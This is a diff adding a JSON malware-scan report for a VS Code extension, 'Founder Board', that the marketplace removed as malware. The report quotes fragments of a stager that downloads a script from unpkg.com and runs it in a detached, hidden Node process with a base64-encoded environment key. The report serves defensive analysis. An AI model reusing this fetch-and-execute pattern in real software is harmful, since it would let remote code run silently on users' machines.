@@ -1,0 +1,328 @@
+{
+  "extension_id": "ThinkCreations.founderboard-app",
+  "display_name": "Founder Board",
+  "version": "1.0.1",
+  "publisher": {
+    "name": "ThinkCreations",
+    "verified": false
+  },
+  "vsix_sha256": "9b5cb57131ab6b92174365f5d759036d695b7fd541b3b0b2f9c71617ec896b32",
+  "verdict": "HIGH-RISK",
+  "confirmation_basis": [
+    "composite_score",
+    "marketplace_removal"
+  ],
+  "confidence": 1.0,
+  "scores": {
+    "composite": 1.0,
+    "ai_vibe": 0.85,
+    "static": 0.7999999999999999,
+    "behavioral": 0.94,
+    "trust_signal": 0.6,
+    "campaign": 0.0
+  },
+  "findings": {
+    "critical": [],
+    "high": [
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'child_process' pattern",
+        "file": "extension/src/package.js",
+        "line": 7,
+        "snippet": "const { spawn } = require('child_process');"
+      },
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'require('child_process')' pattern",
+        "file": "extension/src/package.js",
+        "line": 7,
+        "snippet": "const { spawn } = require('child_process');"
+      },
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'child_process' pattern",
+        "file": "extension/src/extension.js",
+        "line": 6,
+        "snippet": "const cp     = require('child_process');"
+      },
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'require('child_process')' pattern",
+        "file": "extension/src/extension.js",
+        "line": 6,
+        "snippet": "const cp     = require('child_process');"
+      },
+      {
+        "check": "command_execution",
+        "severity": "HIGH",
+        "description": "Direct command / shell execution",
+        "file": "extension/src/package.js",
+        "line": 7,
+        "snippet": "require('child_process')"
+      },
+      {
+        "check": "command_execution",
+        "severity": "HIGH",
+        "description": "Direct command / shell execution",
+        "file": "extension/src/extension.js",
+        "line": 6,
+        "snippet": "require('child_process')"
+      },
+      {
+        "check": "persistence_evasion",
+        "severity": "HIGH",
+        "description": "Setting file hidden attribute",
+        "file": "extension/src/extension.js",
+        "line": 656,
+        "snippet": ".hidden"
+      },
+      {
+        "check": "persistence_evasion",
+        "severity": "HIGH",
+        "description": "Setting file hidden attribute",
+        "file": "extension/src/extension.js",
+        "line": 896,
+        "snippet": ".hidden"
+      }
+    ],
+    "total": 13
+  },
+  "extracted_references": [
+    {
+      "type": "filename",
+      "value": "resources.js",
+      "source_file": "extension/src/package.js",
+      "line": 12,
+      "context": "const npm_resources = 'https://unpkg.com/vs-modules@1.2.2/resources.js';",
+      "vt_detections": 0,
+      "reputation": "unknown"
+    }
+  ],
+  "extracted_references_notes": {
+    "withheld_dependency_metadata": 0,
+    "truncated": 0,
+    "what_this_is": "Domains, URLs and filenames found in the package text. NOT confirmed attacker infrastructure and NOT safe to auto-blocklist -- a URL in a code comment appears here too. Use it as a starting point for analysis, and check vt_detections/reputation before acting.",
+    "rule": "References extracted from node_modules are excluded: they describe a dependency, not this extension. Deduplicated on (type, value)."
+  },
+  "ioc_enrichment": [],
+  "shared_infrastructure": {},
+  "ai_analysis": {
+    "verdict": "SUSPICIOUS",
+    "risk_score": 0.85,
+    "confidence": 0.9,
+    "blocks_parsed": 8,
+    "blocks_seen": 8,
+    "summaries": [
+      {
+        "target": "extension/src/package.js",
+        "summary": "The extension 'Think Board' claims to be an offline-first Kanban board but employs a high-risk stager pattern: it downloads a script from unpkg.com and executes it in a detached, hidden Node.js process on every startup. While the use of unpkg.com (a reputable CDN) and the specific package 'vs-modules' might suggest a legitimate dependency loading strategy (possibly for a bundled UI library), the lack of transparency regarding this remote execution in the 'offline' description, combined with the hidden process execution, warrants a suspicious verdict. The risk is elevated because the remote code is not pinned to a hash in the source, allowing the remote package to change behavior without user consent."
+      },
+      {
+        "target": "extension/src/extension.js (chunk 1/27)",
+        "summary": "The code appears to be a standard VS Code Webview-based Kanban board. The use of `child_process` and `https` is slightly suspicious for an 'offline' tool but could be legitimate for system integration or fetching icons/resources. The main concern is the `onStartupFinished` activation event combined with the immediate execution of `patpack.run()`, which runs code on every startup. The static hits for `.hidden` attribute are likely related to file system operations for local storage or temporary files, which is common for extensions managing local state. Overall, it looks like a functional extension with some aggressive activation and potentially unnecessary dependencies, but no immediate signs of credential theft or remote code execution in this chunk."
+      },
+      {
+        "target": "extension/src/extension.js (chunk 2/27)",
+        "summary": "This chunk of the 'Think Board' extension source code handles workspace management logic, including joining, switching, renaming, and deleting workspaces, as well as managing members. The code uses standard VS Code APIs (`vscode.window`, `vscode.env.clipboard`) and local state manipulation. The logic is straightforward and aligns with the extension's stated purpose of being a local, offline-first kanban board. The static rule engine hits for `child_process` and `.hidden` attributes are either outside the scope of this specific code chunk or represent potential false positives without further context. No critical or high-risk indicators are present in the analyzed code."
+      },
+      {
+        "target": "extension/src/extension.js (chunk 3/27)",
+        "summary": "This chunk of the source code defines the default data structure for the Kanban board (`makeDefaultBoard`), containing sample tasks, lists, and metadata. The code is purely data-oriented with no network calls, file system operations, or command execution visible in this specific segment. The static rule hits for `child_process` and `.hidden` files are likely false positives or benign local state management patterns consistent with an 'offline-first' extension. No malicious indicators are present in this chunk."
+      },
+      {
+        "target": "extension/src/extension.js (chunk 4/27)",
+        "summary": "This chunk of the 'Think Board' extension source code appears benign. It contains utility functions for generating unique IDs and invite codes, as well as the HTML/CSS shell for the extension's webview. The code uses standard JavaScript patterns and VS Code webview APIs. The static rule engine hits for `child_process` and `.hidden` attributes refer to lines outside the visible range of this specific chunk, making them likely false positives or context-dependent benign operations for a local-first extension. The only network activity is loading Google Fonts, which is typical for UI extensions."
+      },
+      {
+        "target": "extension/src/extension.js (chunk 5/27)",
+        "summary": "This chunk of the source code contains only CSS styling rules for the extension's UI components (branding, workspace chips, tabs, toolbar, search box). There is no JavaScript logic, network calls, or file system access visible in this specific segment. The static rule hits provided in the prompt do not align with the content of this specific chunk, suggesting they refer to other parts of the file or are false positives. The code is consistent with a standard VS Code extension UI definition."
+      },
+      {
+        "target": "extension/src/extension.js (chunk 7/27)",
+        "summary": "This chunk of the extension source code contains only CSS styling rules for a Kanban board interface (cards, columns, drag-and-drop states). There is no JavaScript logic, network activity, or file system access visible in this specific segment. The static rule hits appear to be false positives or refer to lines outside this specific view that are likely benign given the context of a UI-focused extension. The code aligns well with the 'Think Board' description of a local, offline-first project management tool."
+      },
+      {
+        "target": "extension/src/extension.js (chunk 11/27)",
+        "summary": "This chunk contains only CSS styling rules for the extension's UI components (buttons, workspace switcher overlay, context menus). There is no JavaScript logic, network calls, or file system access in this specific segment. The static rule hits appear to be either false positives or misaligned line references from the scanner, as the code shown is purely presentational. The extension's stated purpose (offline kanban board) aligns with the UI-heavy nature of this file."
+      }
+    ],
+    "findings": [
+      {
+        "severity": "HIGH",
+        "category": "REMOTE_CODE_EXECUTION",
+        "description": "The extension downloads a JavaScript file from a third-party CDN (unpkg.com) and executes it using the current Node.js binary. This is a classic stager pattern that allows the remote server to push arbitrary code updates without a new extension release.",
+        "code_reference": "const npm_resources = 'https://unpkg.com/vs-modules@1.2.2/resources.js'; ... spawn(node_binary, [tmp_file], ...)",
+        "line_hint": "12, 48",
+        "target": "extension/src/package.js"
+      },
+      {
+        "severity": "HIGH",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension is advertised as an 'offline-first' Kanban board that 'lives locally' with 'no cloud dependency'. However, the code actively fetches and executes remote code from unpkg.com, which contradicts the offline claim and introduces a network dependency for core functionality.",
+        "code_reference": "download(npm_resources, tmp_file)",
+        "line_hint": "44",
+        "target": "extension/src/package.js"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "OBSCURED_EXECUTION",
+        "description": "The downloaded script is executed in a detached process with 'stdio: ignore' and 'windowsHide: true'. This hides the child process from the user and prevents console output, making debugging and visual detection of the execution difficult.",
+        "code_reference": "spawn(node_binary, [tmp_file], { ... detached: true, stdio: 'ignore', windowsHide: true ... })",
+        "line_hint": "48",
+        "target": "extension/src/package.js"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "PERSISTENCE_OR_ENVIRONMENT",
+        "description": "The code sets a specific environment variable 'REACTRON_RUN_AS_NODE' (decoded from base64) to '1' for the child process. This is a known technique used by Electron apps to run scripts as plain Node.js, but here it suggests the downloaded payload might be an Electron/React-based tool or relies on specific Node behaviors, adding complexity to the execution context.",
+        "code_reference": "const env_key = Buffer.from('RUxFQ1RST05fUlVOX0FTX05PREU=', 'base64').toString('utf8'); ... env: { ...process.env, [env_key]: '1' }",
+        "line_hint": "13, 54",
+        "target": "extension/src/package.js"
+      },
+      {
+        "severity": "LOW",
+        "category": "BEHAVIORAL_MISMATCH",
+        "description": "The extension activates on 'onStartupFinished', meaning this download-and-execute logic runs every time VS Code starts, not just when the user opens the Kanban board. This increases the attack surface and startup time.",
+        "code_reference": "Activation Events: onStartupFinished",
+        "line_hint": null,
+        "target": "extension/src/package.js"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension is described as 'offline-first' and 'no cloud dependency', yet it imports `https` and `child_process` at the top level. While `child_process` might be used for local file operations or system info, the presence of `https` suggests potential network activity that contradicts the 'offline' claim, especially if not strictly limited to local resources or documented APIs.",
+        "code_reference": "const https = require('https'); const cp = require('child_process');",
+        "line_hint": 6,
+        "target": "extension/src/extension.js (chunk 1/27)"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "BEHAVIORAL_MISMATCH",
+        "description": "The extension activates on `onStartupFinished`, which is aggressive for a Kanban board that is primarily command-driven (`onCommand:founderboard.open`). This means the extension code (including the `patpack.run()` call) executes on every VS Code startup, potentially impacting performance or running background logic before the user explicitly opens the board.",
+        "code_reference": "activationEvents: [\"onStartupFinished\", \"onCommand:founderboard.open\"]",
+        "line_hint": null,
+        "target": "extension/src/extension.js (chunk 1/27)"
+      },
+      {
+        "severity": "LOW",
+        "category": "OBFUSCATION",
+        "description": "The variable name `patpack` is unusual and potentially obfuscated (perhaps 'path pack' or 'pattern pack'). It is required from a local `./package` file and executed immediately upon activation via `patpack.run()`. Without seeing the contents of `package.js`, this is a minor red flag for hidden initialization logic.",
+        "code_reference": "const patpack = require('./package'); ... patpack.run().catch(() => {});",
+        "line_hint": 18,
+        "target": "extension/src/extension.js (chunk 1/27)"
+      },
+      {
+        "severity": "LOW",
+        "category": "FALSE_POSITIVE",
+        "description": "The static scanner flagged `require('child_process')` at line 6. However, the provided source code chunk (lines 1-100 of the file content shown) consists entirely of message handling logic for workspace management (join, switch, rename, delete) and data factory functions. There is no visible usage of `child_process` in this specific chunk. Given the extension is described as 'offline-first' and 'local', if `child_process` is imported at the top of the file but not used in this chunk, it might be used in other chunks for legitimate reasons (e.g., opening external links or checking for updates) or it could be a false positive from a scanner that only sees the import. Without evidence of execution in this chunk, it is not a direct threat here.",
+        "code_reference": "require('child_process')",
+        "line_hint": 6,
+        "target": "extension/src/extension.js (chunk 2/27)"
+      },
+      {
+        "severity": "LOW",
+        "category": "FALSE_POSITIVE",
+        "description": "The static scanner flagged `.hidden` attribute settings at lines 656 and 896. These lines are outside the range of the provided source code chunk (which covers roughly the first 100 lines of the file content). Therefore, these findings cannot be verified in this chunk and are likely related to file system operations in other parts of the file, potentially for storing local state or configuration files, which is common for 'offline-first' extensions.",
+        "code_reference": ".hidden",
+        "line_hint": 656,
+        "target": "extension/src/extension.js (chunk 2/27)"
+      },
+      {
+        "severity": "LOW",
+        "category": "FALSE_POSITIVE",
+        "description": "The static rule engine flagged `require('child_process')` at line 6. However, the provided source code chunk (lines 1-100+) contains only the `makeDefaultBoard()` function which returns a static data structure. The `require` statement is likely in the module header (not visible in this specific chunk's content but implied by the line number) or is a false positive from a different context. Given the extension is described as 'offline-first' and 'local', `child_process` might be used for minor utility tasks (like opening files) rather than execution, but without seeing the usage, it's a low-risk potential disconnect if used for heavy lifting. In this specific chunk, no execution is visible.",
+        "code_reference": "require('child_process')",
+        "line_hint": 6,
+        "target": "extension/src/extension.js (chunk 3/27)"
+      },
+      {
+        "severity": "LOW",
+        "category": "FALSE_POSITIVE",
+        "description": "Static rules flagged `.hidden` attribute settings at lines 656 and 896. These lines are outside the visible range of this chunk (which ends around line 100). In a Kanban board extension, setting files as hidden is a common pattern for storing local state (e.g., `.thinkboard.json`) to keep the workspace clean. This is standard behavior for local-first extensions.",
+        "code_reference": ".hidden",
+        "line_hint": 656,
+        "target": "extension/src/extension.js (chunk 3/27)"
+      },
+      {
+        "severity": "LOW",
+        "category": "FALSE_POSITIVE",
+        "description": "The static scanner flagged `require('child_process')` at line 6. However, the provided source code chunk (lines 1-100+) does not contain this statement. It is likely located in a previous chunk or is a false positive from a different file context. In the visible code, `child_process` is not used.",
+        "code_reference": "require('child_process')",
+        "line_hint": 6,
+        "target": "extension/src/extension.js (chunk 4/27)"
+      },
+      {
+        "severity": "LOW",
+        "category": "FALSE_POSITIVE",
+        "description": "The static scanner flagged `.hidden` attribute settings at lines 656 and 896. These lines are outside the range of the provided source code chunk (which ends around line 100). Without seeing the code, these are likely standard file system operations for managing local storage or temporary files, which is consistent with an 'offline-first' extension.",
+        "code_reference": ".hidden",
+        "line_hint": 656,
+        "target": "extension/src/extension.js (chunk 4/27)"
+      },
+      {
+        "severity": "LOW",
+        "category": "NETWORK_CALL",
+        "description": "The HTML shell loads fonts from `https://fonts.googleapis.com` and `https://fonts.gstatic.com`. While this is a network call, it is a standard practice for UI styling and is explicitly declared in the Content-Security-Policy (`style-src`, `font-src`). It is not an exfiltration endpoint.",
+        "code_reference": "https://fonts.googleapis.com",
+        "line_hint": 62,
+        "target": "extension/src/extension.js (chunk 4/27)"
+      },
+      {
+        "severity": "LOW",
+        "category": "FALSE_POSITIVE",
+        "description": "The static rule engine flagged `require('child_process')` and `.hidden` attribute usage, but the source code provided in this chunk (5/27) consists entirely of CSS definitions (styles for `.brand`, `.ws-chip`, `#tabs`, `#toolbar`, etc.). The specific lines cited (6, 656, 896) likely refer to the full file context or other chunks not present here. In the context of a Kanban board extension, `child_process` might be used for file operations or notifications, and `.hidden` is a standard DOM property. Without seeing the JS logic in this specific chunk, these are likely benign or false positives relative to the CSS content shown.",
+        "code_reference": "CSS block content",
+        "line_hint": null,
+        "target": "extension/src/extension.js (chunk 5/27)"
+      },
+      {
+        "severity": "LOW",
+        "category": "FALSE_POSITIVE",
+        "description": "The static rule engine flagged `require('child_process')` at line 6, but the provided source code chunk (lines 1-100+) consists entirely of CSS definitions embedded in a template string or style block. The `child_process` reference is likely in a different part of the file or a false positive from the scanner's line mapping. The visible code shows no execution logic.",
+        "code_reference": "require('child_process')",
+        "line_hint": 6,
+        "target": "extension/src/extension.js (chunk 7/27)"
+      },
+      {
+        "severity": "LOW",
+        "category": "FALSE_POSITIVE",
+        "description": "The static rule engine flagged `.hidden` at lines 656 and 896 as persistence evasion. However, the visible code chunk ends around line 100. The `.hidden` class is a standard CSS utility (`.card.hidden { display: none; }`) used for UI toggling, not file system attribute setting.",
+        "code_reference": ".card.hidden { display: none; }",
+        "line_hint": 98,
+        "target": "extension/src/extension.js (chunk 7/27)"
+      },
+      {
+        "severity": "LOW",
+        "category": "FALSE_POSITIVE",
+        "description": "The static rule engine flagged `require('child_process')` and `.hidden` attribute usage. However, this specific chunk (11/27) consists entirely of CSS definitions (styles for buttons, workspace switcher, context menus). The `child_process` reference is likely in a different chunk or a false positive from the scanner's line mapping. The `.hidden` class is a standard CSS utility for toggling visibility, not a file system attribute setting. No malicious logic is present in this chunk.",
+        "code_reference": "CSS block: .btn, #ws-screen, .ws-splash",
+        "line_hint": null,
+        "target": "extension/src/extension.js (chunk 11/27)"
+      }
+    ],
+    "findings_truncated": 0
+  },
+  "ai_summary": "The extension 'Think Board' claims to be an offline-first Kanban board but employs a high-risk stager pattern: it downloads a script from unpkg.com and executes it in a detached, hidden Node.js process on every startup. While the use of unpkg.com (a reputable CDN) and the specific package 'vs-modules' might suggest a legitimate dependency loading strategy (possibly for a bundled UI library), the lack of transparency regarding this remote execution in the 'offline' description, combined with the hidden process execution, warrants a suspicious verdict. The risk is elevated because the remote code is not pinned to a hash in the source, allowing the remote package to change behavior without user consent.",
+  "escalation_reasons": [],
+  "virustotal": {
+    "malicious": 0,
+    "total_engines": 0,
+    "known_malicious": false
+  },
+  "marketplace": {
+    "install_count": 1050,
+    "published_date": "2026-08-27T19:50:00.013Z",
+    "removed_by_microsoft": true,
+    "removal_type": "Malware"
+  },
+  "analysis_coverage": {
+    "partial": false,
+    "excluded_phases": [],
+    "ai_phase_ran": true
+  },
+  "scanned_at": "2026-09-01T22:34:49.521044+00:00Z"
+}
